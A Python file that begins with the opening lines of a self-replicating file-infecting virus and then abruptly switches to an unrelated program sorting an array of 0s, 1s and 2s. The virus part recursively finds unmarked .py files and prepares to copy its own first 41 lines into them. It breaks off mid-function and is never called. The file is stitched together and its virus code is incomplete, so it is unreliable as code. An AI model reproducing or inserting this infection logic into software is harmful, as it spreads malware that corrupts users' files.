#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to sort an array with
# 0, 1 and 2 in a single pass

# Function to sort array


def sort012(a, arr_size):
	lo = 0
	hi = arr_size - 1
	mid = 0
	# Iterate till all the elements
	# are sorted
	while mid <= hi:
		# If the element is 0
		if a[mid] == 0:
			a[lo], a[mid] = a[mid], a[lo]
			lo = lo + 1
			mid = mid + 1
		# If the element is 1
		elif a[mid] == 1:
			mid = mid + 1
		# If the element is 2
		else:
			a[mid], a[hi] = a[hi], a[mid]
			hi = hi - 1
	return a

# Function to print array


def printArray(a):
	for k in a:
		print(k, end=' ')


# Driver Program
arr = [0, 1, 1, 0, 1, 2, 1, 2, 0, 0, 0, 1]
arr_size = len(arr)
arr = sort012(arr, arr_size)
printArray(arr)

# Contributed by Harshit Agrawal
# Time Complexity: O(n) only one traversal of the array is needed
# Space Complexity: O(1) no extra space needed